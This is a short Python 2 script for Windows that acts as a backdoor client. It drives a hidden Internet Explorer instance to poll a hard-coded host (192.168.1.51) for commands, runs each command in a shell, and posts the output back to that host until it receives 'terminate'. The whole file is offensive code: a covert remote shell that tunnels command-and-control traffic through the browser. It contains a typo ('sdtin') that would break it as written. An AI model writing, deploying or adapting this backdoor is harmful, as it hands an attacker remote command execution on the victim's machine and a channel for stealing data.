#!/usr/bin/python

from win32com.client import Dispatch
from time import sleep
import subprocess



# Create browser
ie = Dispatch("InternetExplorer.Application")
ie.visible = 0

#Post
dURL = "http://192.168.1.51"
Flags = 0
TagetFrame = ""

while True:
	ie.Navigate("http://192.168.1.51")
	while ie.ReadyState != 4:
		sleep(1)

	command = ie.Document.body.innerHTML

	command = unicode(command)
	command = command.encode('ascii', 'ignore')
	print '[+] we received command '+ command

	if 'terminate' in command:
		ie.Quit()
		break
	else:
		CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, sdtin=subprocess.PIPE)
		Data = CMD.stdout.read()
		PostData = buffer( Data)

		ie.Navigate( dURL, Flags, TagetFrame, PostData)

	sleep(3)